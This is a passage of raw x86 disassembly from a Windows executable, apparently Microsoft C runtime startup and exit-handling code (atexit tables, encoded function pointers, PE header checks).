  404a4d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404a50:	8b 00                	mov    (%eax),%eax
  404a52:	ff 30                	push   (%eax)
  404a54:	e8 f2 fe ff ff       	call   0x40494b
  404a59:	83 c4 04             	add    $0x4,%esp
  404a5c:	c3                   	ret
  404a5d:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404a60:	e8 24 08 00 00       	call   0x405289
  404a65:	8b 75 10             	mov    0x10(%ebp),%esi
  404a68:	6a 02                	push   $0x2
  404a6a:	e8 bb 20 00 00       	call   0x406b2a
  404a6f:	59                   	pop    %ecx
  404a70:	c3                   	ret
  404a71:	e8 fa 75 00 00       	call   0x40c070
  404a76:	c3                   	ret
  404a77:	8b ff                	mov    %edi,%edi
  404a79:	55                   	push   %ebp
  404a7a:	8b ec                	mov    %esp,%ebp
  404a7c:	e8 9e 24 00 00       	call   0x406f1f
  404a81:	84 c0                	test   %al,%al
  404a83:	74 20                	je     0x404aa5
  404a85:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  404a8b:	8b 40 68             	mov    0x68(%eax),%eax
  404a8e:	c1 e8 08             	shr    $0x8,%eax
  404a91:	a8 01                	test   $0x1,%al
  404a93:	75 10                	jne    0x404aa5
  404a95:	ff 75 08             	push   0x8(%ebp)
  404a98:	ff 15 44 d0 40 00    	call   *0x40d044
  404a9e:	50                   	push   %eax
  404a9f:	ff 15 48 d0 40 00    	call   *0x40d048
  404aa5:	ff 75 08             	push   0x8(%ebp)
  404aa8:	e8 4f 00 00 00       	call   0x404afc
  404aad:	59                   	pop    %ecx
  404aae:	ff 75 08             	push   0x8(%ebp)
  404ab1:	ff 15 c0 d0 40 00    	call   *0x40d0c0
  404ab7:	cc                   	int3
  404ab8:	6a 00                	push   $0x0
  404aba:	ff 15 6c d0 40 00    	call   *0x40d06c
  404ac0:	8b c8                	mov    %eax,%ecx
  404ac2:	85 c9                	test   %ecx,%ecx
  404ac4:	75 03                	jne    0x404ac9
  404ac6:	32 c0                	xor    %al,%al
  404ac8:	c3                   	ret
  404ac9:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  404ace:	66 39 01             	cmp    %ax,(%ecx)
  404ad1:	75 f3                	jne    0x404ac6
  404ad3:	8b 41 3c             	mov    0x3c(%ecx),%eax
  404ad6:	03 c1                	add    %ecx,%eax
  404ad8:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  404ade:	75 e6                	jne    0x404ac6
  404ae0:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  404ae5:	66 39 48 18          	cmp    %cx,0x18(%eax)
  404ae9:	75 db                	jne    0x404ac6
  404aeb:	83 78 74 0e          	cmpl   $0xe,0x74(%eax)
  404aef:	76 d5                	jbe    0x404ac6
  404af1:	83 b8 e8 00 00 00 00 	cmpl   $0x0,0xe8(%eax)
  404af8:	0f 95 c0             	setne  %al
  404afb:	c3                   	ret
  404afc:	8b ff                	mov    %edi,%edi
  404afe:	55                   	push   %ebp
  404aff:	8b ec                	mov    %esp,%ebp
  404b01:	51                   	push   %ecx
  404b02:	51                   	push   %ecx
  404b03:	a1 00 40 41 00       	mov    0x414000,%eax
  404b08:	33 c5                	xor    %ebp,%eax
  404b0a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404b0d:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404b11:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404b14:	50                   	push   %eax
  404b15:	68 2c dd 40 00       	push   $0x40dd2c
  404b1a:	6a 00                	push   $0x0
  404b1c:	ff 15 c4 d0 40 00    	call   *0x40d0c4
  404b22:	85 c0                	test   %eax,%eax
  404b24:	74 23                	je     0x404b49
  404b26:	56                   	push   %esi
  404b27:	68 44 dd 40 00       	push   $0x40dd44
  404b2c:	ff 75 f8             	push   -0x8(%ebp)
  404b2f:	ff 15 1c d0 40 00    	call   *0x40d01c
  404b35:	8b f0                	mov    %eax,%esi
  404b37:	85 f6                	test   %esi,%esi
  404b39:	74 0d                	je     0x404b48
  404b3b:	ff 75 08             	push   0x8(%ebp)
  404b3e:	8b ce                	mov    %esi,%ecx
  404b40:	ff 15 3c d1 40 00    	call   *0x40d13c
  404b46:	ff d6                	call   *%esi
  404b48:	5e                   	pop    %esi
  404b49:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  404b4d:	74 09                	je     0x404b58
  404b4f:	ff 75 f8             	push   -0x8(%ebp)
  404b52:	ff 15 a0 d0 40 00    	call   *0x40d0a0
  404b58:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404b5b:	33 cd                	xor    %ebp,%ecx
  404b5d:	e8 fc c6 ff ff       	call   0x40125e
  404b62:	8b e5                	mov    %ebp,%esp
  404b64:	5d                   	pop    %ebp
  404b65:	c3                   	ret
  404b66:	8b ff                	mov    %edi,%edi
  404b68:	55                   	push   %ebp
  404b69:	8b ec                	mov    %esp,%ebp
  404b6b:	8b 45 08             	mov    0x8(%ebp),%eax
  404b6e:	a3 10 4d 41 00       	mov    %eax,0x414d10
  404b73:	5d                   	pop    %ebp
  404b74:	c3                   	ret
  404b75:	6a 01                	push   $0x1
  404b77:	6a 02                	push   $0x2
  404b79:	6a 00                	push   $0x0
  404b7b:	e8 de fd ff ff       	call   0x40495e
  404b80:	83 c4 0c             	add    $0xc,%esp
  404b83:	c3                   	ret
  404b84:	6a 01                	push   $0x1
  404b86:	6a 00                	push   $0x0
  404b88:	6a 00                	push   $0x0
  404b8a:	e8 cf fd ff ff       	call   0x40495e
  404b8f:	83 c4 0c             	add    $0xc,%esp
  404b92:	c3                   	ret
  404b93:	8b ff                	mov    %edi,%edi
  404b95:	55                   	push   %ebp
  404b96:	8b ec                	mov    %esp,%ebp
  404b98:	6a 00                	push   $0x0
  404b9a:	6a 02                	push   $0x2
  404b9c:	ff 75 08             	push   0x8(%ebp)
  404b9f:	e8 ba fd ff ff       	call   0x40495e
  404ba4:	83 c4 0c             	add    $0xc,%esp
  404ba7:	5d                   	pop    %ebp
  404ba8:	c3                   	ret
  404ba9:	8b ff                	mov    %edi,%edi
  404bab:	55                   	push   %ebp
  404bac:	8b ec                	mov    %esp,%ebp
  404bae:	a1 00 40 41 00       	mov    0x414000,%eax
  404bb3:	83 e0 1f             	and    $0x1f,%eax
  404bb6:	6a 20                	push   $0x20
  404bb8:	59                   	pop    %ecx
  404bb9:	2b c8                	sub    %eax,%ecx
  404bbb:	33 c0                	xor    %eax,%eax
  404bbd:	d3 c8                	ror    %cl,%eax
  404bbf:	33 05 00 40 41 00    	xor    0x414000,%eax
  404bc5:	39 05 10 4d 41 00    	cmp    %eax,0x414d10
  404bcb:	0f 85 b8 06 00 00    	jne    0x405289
  404bd1:	ff 75 08             	push   0x8(%ebp)
  404bd4:	e8 9f f6 ff ff       	call   0x404278
  404bd9:	59                   	pop    %ecx
  404bda:	a3 10 4d 41 00       	mov    %eax,0x414d10
  404bdf:	5d                   	pop    %ebp
  404be0:	c3                   	ret
  404be1:	8b ff                	mov    %edi,%edi
  404be3:	55                   	push   %ebp
  404be4:	8b ec                	mov    %esp,%ebp
  404be6:	6a 00                	push   $0x0
  404be8:	6a 00                	push   $0x0
  404bea:	ff 75 08             	push   0x8(%ebp)
  404bed:	e8 6c fd ff ff       	call   0x40495e
  404bf2:	83 c4 0c             	add    $0xc,%esp
  404bf5:	5d                   	pop    %ebp
  404bf6:	c3                   	ret
  404bf7:	8b ff                	mov    %edi,%edi
  404bf9:	55                   	push   %ebp
  404bfa:	8b ec                	mov    %esp,%ebp
  404bfc:	8b 45 08             	mov    0x8(%ebp),%eax
  404bff:	3d 00 40 00 00       	cmp    $0x4000,%eax
  404c04:	74 23                	je     0x404c29
  404c06:	3d 00 80 00 00       	cmp    $0x8000,%eax
  404c0b:	74 1c                	je     0x404c29
  404c0d:	3d 00 00 01 00       	cmp    $0x10000,%eax
  404c12:	74 15                	je     0x404c29
  404c14:	e8 e0 0f 00 00       	call   0x405bf9
  404c19:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404c1f:	e8 19 0f 00 00       	call   0x405b3d
  404c24:	6a 16                	push   $0x16
  404c26:	58                   	pop    %eax
  404c27:	5d                   	pop    %ebp
  404c28:	c3                   	ret
  404c29:	b9 8c 4f 41 00       	mov    $0x414f8c,%ecx
  404c2e:	87 01                	xchg   %eax,(%ecx)
  404c30:	33 c0                	xor    %eax,%eax
  404c32:	5d                   	pop    %ebp
  404c33:	c3                   	ret
  404c34:	33 c0                	xor    %eax,%eax
  404c36:	b9 18 4d 41 00       	mov    $0x414d18,%ecx
  404c3b:	40                   	inc    %eax
  404c3c:	87 01                	xchg   %eax,(%ecx)
  404c3e:	c3                   	ret
  404c3f:	6a 08                	push   $0x8
  404c41:	68 c0 26 41 00       	push   $0x4126c0
  404c46:	e8 55 cf ff ff       	call   0x401ba0
  404c4b:	be 80 45 41 00       	mov    $0x414580,%esi
  404c50:	39 35 94 51 41 00    	cmp    %esi,0x415194
  404c56:	74 2a                	je     0x404c82
  404c58:	6a 04                	push   $0x4
  404c5a:	e8 83 1e 00 00       	call   0x406ae2
  404c5f:	59                   	pop    %ecx
  404c60:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404c64:	56                   	push   %esi
  404c65:	68 94 51 41 00       	push   $0x415194
  404c6a:	e8 5c 2f 00 00       	call   0x407bcb
  404c6f:	59                   	pop    %ecx
  404c70:	59                   	pop    %ecx
  404c71:	a3 94 51 41 00       	mov    %eax,0x415194
  404c76:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404c7d:	e8 06 00 00 00       	call   0x404c88
  404c82:	e8 69 cf ff ff       	call   0x401bf0
  404c87:	c3                   	ret
  404c88:	6a 04                	push   $0x4
  404c8a:	e8 9b 1e 00 00       	call   0x406b2a
  404c8f:	59                   	pop    %ecx
  404c90:	c3                   	ret
  404c91:	8b ff                	mov    %edi,%edi
  404c93:	55                   	push   %ebp
  404c94:	8b ec                	mov    %esp,%ebp
  404c96:	56                   	push   %esi
  404c97:	e8 88 0b 00 00       	call   0x405824
  404c9c:	8b 55 08             	mov    0x8(%ebp),%edx
  404c9f:	8b f0                	mov    %eax,%esi
  404ca1:	6a 00                	push   $0x0
  404ca3:	58                   	pop    %eax
  404ca4:	8b 8e 50 03 00 00    	mov    0x350(%esi),%ecx
  404caa:	f6 c1 02             	test   $0x2,%cl
  404cad:	0f 94 c0             	sete   %al
  404cb0:	40                   	inc    %eax
  404cb1:	83 fa ff             	cmp    $0xffffffff,%edx
  404cb4:	74 33                	je     0x404ce9
  404cb6:	85 d2                	test   %edx,%edx
  404cb8:	74 36                	je     0x404cf0
  404cba:	83 fa 01             	cmp    $0x1,%edx
  404cbd:	74 1f                	je     0x404cde
  404cbf:	83 fa 02             	cmp    $0x2,%edx
  404cc2:	74 15                	je     0x404cd9
  404cc4:	e8 30 0f 00 00       	call   0x405bf9
  404cc9:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404ccf:	e8 69 0e 00 00       	call   0x405b3d
  404cd4:	83 c8 ff             	or     $0xffffffff,%eax
  404cd7:	eb 17                	jmp    0x404cf0
  404cd9:	83 e1 fd             	and    $0xfffffffd,%ecx
  404cdc:	eb 03                	jmp    0x404ce1
  404cde:	83 c9 02             	or     $0x2,%ecx
  404ce1:	89 8e 50 03 00 00    	mov    %ecx,0x350(%esi)
  404ce7:	eb 07                	jmp    0x404cf0
  404ce9:	83 0d a0 46 41 00 ff 	orl    $0xffffffff,0x4146a0
  404cf0:	5e                   	pop    %esi
  404cf1:	5d                   	pop    %ebp
  404cf2:	c3                   	ret
  404cf3:	a1 1c 4d 41 00       	mov    0x414d1c,%eax
  404cf8:	c3                   	ret
  404cf9:	8b ff                	mov    %edi,%edi
  404cfb:	55                   	push   %ebp
  404cfc:	8b ec                	mov    %esp,%ebp
  404cfe:	8b 45 08             	mov    0x8(%ebp),%eax
  404d01:	85 c0                	test   %eax,%eax
  404d03:	74 1a                	je     0x404d1f
  404d05:	83 f8 01             	cmp    $0x1,%eax
  404d08:	74 15                	je     0x404d1f
  404d0a:	e8 ea 0e 00 00       	call   0x405bf9
  404d0f:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404d15:	e8 23 0e 00 00       	call   0x405b3d
  404d1a:	83 c8 ff             	or     $0xffffffff,%eax
  404d1d:	5d                   	pop    %ebp
  404d1e:	c3                   	ret
  404d1f:	b9 1c 4d 41 00       	mov    $0x414d1c,%ecx
  404d24:	87 01                	xchg   %eax,(%ecx)
  404d26:	5d                   	pop    %ebp
  404d27:	c3                   	ret
  404d28:	b8 20 4d 41 00       	mov    $0x414d20,%eax
  404d2d:	c3                   	ret
  404d2e:	6a 0c                	push   $0xc
  404d30:	68 e0 26 41 00       	push   $0x4126e0
  404d35:	e8 66 ce ff ff       	call   0x401ba0
  404d3a:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  404d3e:	8b 45 08             	mov    0x8(%ebp),%eax
  404d41:	ff 30                	push   (%eax)
  404d43:	e8 9a 1d 00 00       	call   0x406ae2
  404d48:	59                   	pop    %ecx
  404d49:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404d4d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404d50:	e8 eb 01 00 00       	call   0x404f40
  404d55:	8b f0                	mov    %eax,%esi
  404d57:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404d5a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404d61:	e8 0d 00 00 00       	call   0x404d73
  404d66:	8b c6                	mov    %esi,%eax
  404d68:	e8 83 ce ff ff       	call   0x401bf0
  404d6d:	c2 0c 00             	ret    $0xc
  404d70:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  404d73:	8b 45 10             	mov    0x10(%ebp),%eax
  404d76:	ff 30                	push   (%eax)
  404d78:	e8 ad 1d 00 00       	call   0x406b2a
  404d7d:	59                   	pop    %ecx
  404d7e:	c3                   	ret
  404d7f:	6a 0c                	push   $0xc
  404d81:	68 00 27 41 00       	push   $0x412700
  404d86:	e8 15 ce ff ff       	call   0x401ba0
  404d8b:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  404d8f:	8b 45 08             	mov    0x8(%ebp),%eax
  404d92:	ff 30                	push   (%eax)
  404d94:	e8 49 1d 00 00       	call   0x406ae2
  404d99:	59                   	pop    %ecx
  404d9a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404d9e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404da1:	e8 7a 00 00 00       	call   0x404e20
  404da6:	8b f0                	mov    %eax,%esi
  404da8:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  404dab:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404db2:	e8 0d 00 00 00       	call   0x404dc4
  404db7:	8b c6                	mov    %esi,%eax
  404db9:	e8 32 ce ff ff       	call   0x401bf0
  404dbe:	c2 0c 00             	ret    $0xc
  404dc1:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  404dc4:	8b 45 10             	mov    0x10(%ebp),%eax
  404dc7:	ff 30                	push   (%eax)
  404dc9:	e8 5c 1d 00 00       	call   0x406b2a
  404dce:	59                   	pop    %ecx
  404dcf:	c3                   	ret
  404dd0:	8b ff                	mov    %edi,%edi
  404dd2:	55                   	push   %ebp
  404dd3:	8b ec                	mov    %esp,%ebp
  404dd5:	83 ec 0c             	sub    $0xc,%esp
  404dd8:	8b 45 08             	mov    0x8(%ebp),%eax
  404ddb:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  404dde:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404de1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404de4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404de7:	50                   	push   %eax
  404de8:	ff 75 0c             	push   0xc(%ebp)
  404deb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404dee:	50                   	push   %eax
  404def:	e8 8b ff ff ff       	call   0x404d7f
  404df4:	8b e5                	mov    %ebp,%esp
  404df6:	5d                   	pop    %ebp
  404df7:	c3                   	ret
  404df8:	8b ff                	mov    %edi,%edi
  404dfa:	55                   	push   %ebp
  404dfb:	8b ec                	mov    %esp,%ebp
  404dfd:	83 ec 0c             	sub    $0xc,%esp
  404e00:	8b 45 08             	mov    0x8(%ebp),%eax
  404e03:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  404e06:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404e09:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404e0c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404e0f:	50                   	push   %eax
  404e10:	ff 75 0c             	push   0xc(%ebp)
  404e13:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404e16:	50                   	push   %eax
  404e17:	e8 12 ff ff ff       	call   0x404d2e
  404e1c:	8b e5                	mov    %ebp,%esp
  404e1e:	5d                   	pop    %ebp
  404e1f:	c3                   	ret
  404e20:	8b ff                	mov    %edi,%edi
  404e22:	55                   	push   %ebp
  404e23:	8b ec                	mov    %esp,%ebp
  404e25:	83 ec 18             	sub    $0x18,%esp
  404e28:	a1 00 40 41 00       	mov    0x414000,%eax
  404e2d:	33 c5                	xor    %ebp,%eax
  404e2f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404e32:	8b c1                	mov    %ecx,%eax
  404e34:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404e37:	53                   	push   %ebx
  404e38:	8b 00                	mov    (%eax),%eax
  404e3a:	8b 18                	mov    (%eax),%ebx
  404e3c:	85 db                	test   %ebx,%ebx
  404e3e:	75 08                	jne    0x404e48
  404e40:	83 c8 ff             	or     $0xffffffff,%eax
  404e43:	e9 e9 00 00 00       	jmp    0x404f31
  404e48:	8b 15 00 40 41 00    	mov    0x414000,%edx
  404e4e:	56                   	push   %esi
  404e4f:	57                   	push   %edi
  404e50:	8b 3b                	mov    (%ebx),%edi
  404e52:	8b f2                	mov    %edx,%esi
  404e54:	8b 5b 04             	mov    0x4(%ebx),%ebx
  404e57:	83 e6 1f             	and    $0x1f,%esi
  404e5a:	33 fa                	xor    %edx,%edi
  404e5c:	89 75 ec             	mov    %esi,-0x14(%ebp)
  404e5f:	8b ce                	mov    %esi,%ecx
  404e61:	33 da                	xor    %edx,%ebx
  404e63:	d3 cf                	ror    %cl,%edi
  404e65:	d3 cb                	ror    %cl,%ebx
  404e67:	85 ff                	test   %edi,%edi
  404e69:	0f 84 be 00 00 00    	je     0x404f2d
  404e6f:	83 ff ff             	cmp    $0xffffffff,%edi
  404e72:	0f 84 b5 00 00 00    	je     0x404f2d
  404e78:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404e7b:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404e7e:	6a 20                	push   $0x20
  404e80:	59                   	pop    %ecx
  404e81:	2b ce                	sub    %esi,%ecx
  404e83:	33 c0                	xor    %eax,%eax
  404e85:	d3 c8                	ror    %cl,%eax
  404e87:	33 c2                	xor    %edx,%eax
  404e89:	83 eb 04             	sub    $0x4,%ebx
  404e8c:	3b df                	cmp    %edi,%ebx
  404e8e:	72 60                	jb     0x404ef0
  404e90:	39 03                	cmp    %eax,(%ebx)
  404e92:	74 f5                	je     0x404e89
  404e94:	8b 33                	mov    (%ebx),%esi
  404e96:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404e99:	33 f2                	xor    %edx,%esi
  404e9b:	d3 ce                	ror    %cl,%esi
  404e9d:	8b ce                	mov    %esi,%ecx
  404e9f:	89 03                	mov    %eax,(%ebx)
  404ea1:	ff 15 3c d1 40 00    	call   *0x40d13c
  404ea7:	ff d6                	call   *%esi
  404ea9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404eac:	8b 15 00 40 41 00    	mov    0x414000,%edx
  404eb2:	8b f2                	mov    %edx,%esi
  404eb4:	83 e6 1f             	and    $0x1f,%esi
  404eb7:	89 75 ec             	mov    %esi,-0x14(%ebp)
  404eba:	8b 00                	mov    (%eax),%eax
  404ebc:	8b 00                	mov    (%eax),%eax
  404ebe:	8b 08                	mov    (%eax),%ecx
  404ec0:	8b 40 04             	mov    0x4(%eax),%eax
  404ec3:	33 ca                	xor    %edx,%ecx
  404ec5:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404ec8:	33 c2                	xor    %edx,%eax
  404eca:	8b ce                	mov    %esi,%ecx
  404ecc:	d3 4d f8             	rorl   %cl,-0x8(%ebp)
  404ecf:	d3 c8                	ror    %cl,%eax
  404ed1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404ed4:	3b 4d f4             	cmp    -0xc(%ebp),%ecx
  404ed7:	75 0b                	jne    0x404ee4
  404ed9:	6a 20                	push   $0x20
  404edb:	59                   	pop    %ecx
  404edc:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  404edf:	74 a0                	je     0x404e81
  404ee1:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404ee4:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404ee7:	8b f9                	mov    %ecx,%edi
  404ee9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404eec:	8b d8                	mov    %eax,%ebx
  404eee:	eb 8e                	jmp    0x404e7e
  404ef0:	83 ff ff             	cmp    $0xffffffff,%edi
  404ef3:	74 0d                	je     0x404f02
  404ef5:	57                   	push   %edi
  404ef6:	e8 6e 0d 00 00       	call   0x405c69
  404efb:	8b 15 00 40 41 00    	mov    0x414000,%edx
  404f01:	59                   	pop    %ecx
  404f02:	8b c2                	mov    %edx,%eax
  404f04:	33 d2                	xor    %edx,%edx
  404f06:	83 e0 1f             	and    $0x1f,%eax
  404f09:	6a 20                	push   $0x20
  404f0b:	59                   	pop    %ecx
  404f0c:	2b c8                	sub    %eax,%ecx
  404f0e:	d3 ca                	ror    %cl,%edx
  404f10:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404f13:	33 15 00 40 41 00    	xor    0x414000,%edx
  404f19:	8b 01                	mov    (%ecx),%eax
  404f1b:	8b 00                	mov    (%eax),%eax
  404f1d:	89 10                	mov    %edx,(%eax)
  404f1f:	8b 01                	mov    (%ecx),%eax
  404f21:	8b 00                	mov    (%eax),%eax
  404f23:	89 50 04             	mov    %edx,0x4(%eax)
  404f26:	8b 01                	mov    (%ecx),%eax
  404f28:	8b 00                	mov    (%eax),%eax
  404f2a:	89 50 08             	mov    %edx,0x8(%eax)
  404f2d:	5f                   	pop    %edi
  404f2e:	33 c0                	xor    %eax,%eax
  404f30:	5e                   	pop    %esi
  404f31:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404f34:	33 cd                	xor    %ebp,%ecx
  404f36:	5b                   	pop    %ebx
  404f37:	e8 22 c3 ff ff       	call   0x40125e
  404f3c:	8b e5                	mov    %ebp,%esp
  404f3e:	5d                   	pop    %ebp
  404f3f:	c3                   	ret
  404f40:	8b ff                	mov    %edi,%edi
  404f42:	55                   	push   %ebp
  404f43:	8b ec                	mov    %esp,%ebp
  404f45:	83 ec 0c             	sub    $0xc,%esp
  404f48:	8b c1                	mov    %ecx,%eax
  404f4a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f4d:	56                   	push   %esi
  404f4e:	8b 00                	mov    (%eax),%eax
  404f50:	8b 30                	mov    (%eax),%esi
  404f52:	85 f6                	test   %esi,%esi
  404f54:	75 08                	jne    0x404f5e
  404f56:	83 c8 ff             	or     $0xffffffff,%eax
  404f59:	e9 1e 01 00 00       	jmp    0x40507c
  404f5e:	a1 00 40 41 00       	mov    0x414000,%eax
  404f63:	8b c8                	mov    %eax,%ecx
  404f65:	53                   	push   %ebx
  404f66:	8b 1e                	mov    (%esi),%ebx
  404f68:	83 e1 1f             	and    $0x1f,%ecx
  404f6b:	57                   	push   %edi
  404f6c:	8b 7e 04             	mov    0x4(%esi),%edi
  404f6f:	33 d8                	xor    %eax,%ebx
  404f71:	8b 76 08             	mov    0x8(%esi),%esi
  404f74:	33 f8                	xor    %eax,%edi
  404f76:	33 f0                	xor    %eax,%esi
  404f78:	d3 cf                	ror    %cl,%edi
  404f7a:	d3 ce                	ror    %cl,%esi
  404f7c:	d3 cb                	ror    %cl,%ebx
  404f7e:	3b fe                	cmp    %esi,%edi
  404f80:	0f 85 b4 00 00 00    	jne    0x40503a
  404f86:	2b f3                	sub    %ebx,%esi
  404f88:	b8 00 02 00 00       	mov    $0x200,%eax
  404f8d:	c1 fe 02             	sar    $0x2,%esi
  404f90:	3b f0                	cmp    %eax,%esi
  404f92:	77 02                	ja     0x404f96
  404f94:	8b c6                	mov    %esi,%eax
  404f96:	8d 3c 30             	lea    (%eax,%esi,1),%edi
  404f99:	85 ff                	test   %edi,%edi
  404f9b:	75 03                	jne    0x404fa0
  404f9d:	6a 20                	push   $0x20
  404f9f:	5f                   	pop    %edi
  404fa0:	3b fe                	cmp    %esi,%edi
  404fa2:	72 1d                	jb     0x404fc1
  404fa4:	6a 04                	push   $0x4
  404fa6:	57                   	push   %edi
  404fa7:	53                   	push   %ebx
  404fa8:	e8 6e 2c 00 00       	call   0x407c1b
  404fad:	6a 00                	push   $0x0
  404faf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404fb2:	e8 b2 0c 00 00       	call   0x405c69
  404fb7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404fba:	83 c4 10             	add    $0x10,%esp
  404fbd:	85 c9                	test   %ecx,%ecx
  404fbf:	75 28                	jne    0x404fe9
  404fc1:	6a 04                	push   $0x4
  404fc3:	8d 7e 04             	lea    0x4(%esi),%edi
  404fc6:	57                   	push   %edi
  404fc7:	53                   	push   %ebx
  404fc8:	e8 4e 2c 00 00       	call   0x407c1b
  404fcd:	6a 00                	push   $0x0
  404fcf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404fd2:	e8 92 0c 00 00       	call   0x405c69
  404fd7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404fda:	83 c4 10             	add    $0x10,%esp
  404fdd:	85 c9                	test   %ecx,%ecx
  404fdf:	75 08                	jne    0x404fe9
  404fe1:	83 c8 ff             	or     $0xffffffff,%eax
  404fe4:	e9 91 00 00 00       	jmp    0x40507a
  404fe9:	8d 04 b1             	lea    (%ecx,%esi,4),%eax
  404fec:	8b d9                	mov    %ecx,%ebx
  404fee:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404ff1:	8d 34 b9             	lea    (%ecx,%edi,4),%esi
  404ff4:	a1 00 40 41 00       	mov    0x414000,%eax
  404ff9:	8b 7d fc             	mov    -0x4(%ebp),%edi
  404ffc:	83 e0 1f             	and    $0x1f,%eax
  404fff:	6a 20                	push   $0x20
  405001:	59                   	pop    %ecx
  405002:	2b c8                	sub    %eax,%ecx
  405004:	33 c0                	xor    %eax,%eax
  405006:	d3 c8                	ror    %cl,%eax
  405008:	8b cf                	mov    %edi,%ecx
  40500a:	33 05 00 40 41 00    	xor    0x414000,%eax
  405010:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405013:	8b c6                	mov    %esi,%eax
  405015:	2b c7                	sub    %edi,%eax
  405017:	83 c0 03             	add    $0x3,%eax
  40501a:	c1 e8 02             	shr    $0x2,%eax
  40501d:	3b f7                	cmp    %edi,%esi
  40501f:	1b d2                	sbb    %edx,%edx
  405021:	f7 d2                	not    %edx
  405023:	23 d0                	and    %eax,%edx
  405025:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405028:	74 10                	je     0x40503a
  40502a:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40502d:	33 c0                	xor    %eax,%eax
  40502f:	40                   	inc    %eax
  405030:	89 11                	mov    %edx,(%ecx)
  405032:	8d 49 04             	lea    0x4(%ecx),%ecx
  405035:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405038:	75 f5                	jne    0x40502f
  40503a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40503d:	8b 40 04             	mov    0x4(%eax),%eax
  405040:	ff 30                	push   (%eax)
  405042:	e8 31 f2 ff ff       	call   0x404278
  405047:	53                   	push   %ebx
  405048:	89 07                	mov    %eax,(%edi)
  40504a:	e8 29 f2 ff ff       	call   0x404278
  40504f:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  405052:	8b 0b                	mov    (%ebx),%ecx
  405054:	8b 09                	mov    (%ecx),%ecx
  405056:	89 01                	mov    %eax,(%ecx)
  405058:	8d 47 04             	lea    0x4(%edi),%eax
  40505b:	50                   	push   %eax
  40505c:	e8 17 f2 ff ff       	call   0x404278
  405061:	8b 0b                	mov    (%ebx),%ecx
  405063:	56                   	push   %esi
  405064:	8b 09                	mov    (%ecx),%ecx
  405066:	89 41 04             	mov    %eax,0x4(%ecx)
  405069:	e8 0a f2 ff ff       	call   0x404278
  40506e:	8b 0b                	mov    (%ebx),%ecx
  405070:	83 c4 10             	add    $0x10,%esp
  405073:	8b 09                	mov    (%ecx),%ecx
  405075:	89 41 08             	mov    %eax,0x8(%ecx)
  405078:	33 c0                	xor    %eax,%eax
  40507a:	5f                   	pop    %edi
  40507b:	5b                   	pop    %ebx
  40507c:	5e                   	pop    %esi
  40507d:	8b e5                	mov    %ebp,%esp
  40507f:	5d                   	pop    %ebp
  405080:	c3                   	ret
  405081:	8b ff                	mov    %edi,%edi
  405083:	55                   	push   %ebp
  405084:	8b ec                	mov    %esp,%ebp
  405086:	ff 75 08             	push   0x8(%ebp)
  405089:	68 24 4d 41 00       	push   $0x414d24
  40508e:	e8 5e 00 00 00       	call   0x4050f1
  405093:	59                   	pop    %ecx
  405094:	59                   	pop    %ecx
  405095:	5d                   	pop    %ebp
  405096:	c3                   	ret
  405097:	8b ff                	mov    %edi,%edi
